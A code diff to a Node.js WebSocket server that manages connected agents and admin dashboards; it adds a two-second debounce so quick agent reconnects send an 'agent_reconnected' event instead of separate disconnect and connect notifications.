@@ -34,7 +34,10 @@ const wss = new WebSocket.Server({
 // ── State ─────────────────────────────────────────────────────────────────────
 const agents = {};      // agentId → { ws, info }
 const admins = new Set();
-const audioSessions = new Set(); // agentIds currently streaming audio
+const audioSessions = new Set();
+// Debounce disconnect notifications: if agent reconnects within 2s, suppress the disconnect event
+const disconnectTimers = {};
+const DISCONNECT_DEBOUNCE_MS = 2000;
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
 function send(ws, data) {
@@ -124,7 +127,15 @@ wss.on('connection', (ws, req) => {
           }
         };
 
-        broadcastToAdmins({ type: 'agent_connected', ...agents[ws.agentId].info });
+        // Cancel any pending disconnect notification for this agent (debounce reconnect)
+        if (disconnectTimers[ws.agentId]) {
+          clearTimeout(disconnectTimers[ws.agentId]);
+          delete disconnectTimers[ws.agentId];
+          // Agent reconnected quickly — just send an update, not a full disconnect+connect
+          broadcastToAdmins({ type: 'agent_reconnected', ...agents[ws.agentId].info });
+        } else {
+          broadcastToAdmins({ type: 'agent_connected', ...agents[ws.agentId].info });
+        }
         send(ws, { type: 'auth_ok', id: ws.agentId });
         console.log(`[AGENT] ${ws.agentId} (${msg.name}) connected from ${remoteIp}`);
       }
@@ -241,10 +252,20 @@ wss.on('connection', (ws, req) => {
       console.log(`[ADMIN] disconnected (${admins.size} remain)`);
 
     } else if (ws.role === 'agent' && ws.agentId) {
-      audioSessions.delete(ws.agentId);
-      broadcastToAdmins({ type: 'agent_disconnected', id: ws.agentId });
-      delete agents[ws.agentId];
-      console.log(`[AGENT] ${ws.agentId} disconnected`);
+      const id = ws.agentId;
+      audioSessions.delete(id);
+      // Debounce the disconnect — wait 2s before notifying dashboard
+      // This prevents rapid connect/disconnect spam when agent reconnects immediately
+      disconnectTimers[id] = setTimeout(() => {
+        delete disconnectTimers[id];
+        // Only fire disconnect if agent hasn't reconnected with a new ws
+        if (!agents[id] || agents[id].ws === ws) {
+          delete agents[id];
+          broadcastToAdmins({ type: 'agent_disconnected', id });
+        }
+        console.log(`[AGENT] ${id} disconnected (confirmed)`);
+      }, DISCONNECT_DEBOUNCE_MS);
+      console.log(`[AGENT] ${id} disconnected (debouncing ${DISCONNECT_DEBOUNCE_MS}ms)`);
     }
   });
 });
